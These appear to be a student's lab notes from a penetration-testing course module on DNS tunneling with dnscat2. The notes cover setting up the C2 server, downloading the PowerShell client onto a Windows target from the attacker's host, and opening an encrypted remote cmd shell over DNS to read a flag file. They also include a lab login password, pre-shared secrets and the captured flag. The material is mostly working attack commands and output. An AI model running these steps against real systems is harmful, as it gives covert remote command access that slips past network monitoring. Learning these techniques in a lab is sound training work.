# DNS Tunneling with Dnscat2

Uses an encrypted Command-&-Control (C2) to send data inside TXT records within DNS protocol.

1) Cloning dnscat2 and Setting Up the Server

git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

2) Starting the dnscat2 server

sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

3) Cloning dnscat2-powershell to the Attack Host
git clone https://github.com/lukebaggett/dnscat2-powershell.git

-> dnscat2.ps1 on target

4) Importing dnscat2.ps1
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

5) Confirming Session Establishment

New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>

6) Listing dnscat2 Options

dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* windows
...

7) Interacting with the Established Session
dnscat2> window -i 1
C:\Windows\system32>
exec (OFFICEMANAGER) 1>

## LAB

git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

sudo ruby dnscat2.rb --dns host=10.10.15.158,port=53,domain=inlanefreight.local --no-cache

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=a4e567d918fc3bb64fc63cd5a34f1a1a


cd dnscat2-powershell/
git clone https://github.com/lukebaggett/dnscat2-powershell.git

md5sum dnscat2.ps1
d48ec7f31621ce0115d50237c398cd7f  dnscat2.ps1

python3 -m http.server


cat dnscat2-powershell/dnscat2.ps1 |base64 -w 0 > dnscat2.ps1.b64.txt

pip3 install uploadserver

python3 -m uploadserver

xfreerdp /u:htb-student /v:$TARGET
HTB_@cademy_stdnt!

$PSVersionTable

(New-Object Net.WebClient).DownloadFile('http://10.10.15.158:8000/dnscat2.ps1','dnscat2.ps1')
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.15.158 -Domain inlanefreight.local -PreSharedSecret a4e567d918fc3bb64fc63cd5a34f1a1a -Exec cmd

dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
window -i 1

C:\Windows\system32>
exec (OFFICEMANAGER) 1> 

dir C:\Users\htb-student\Documents\
type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel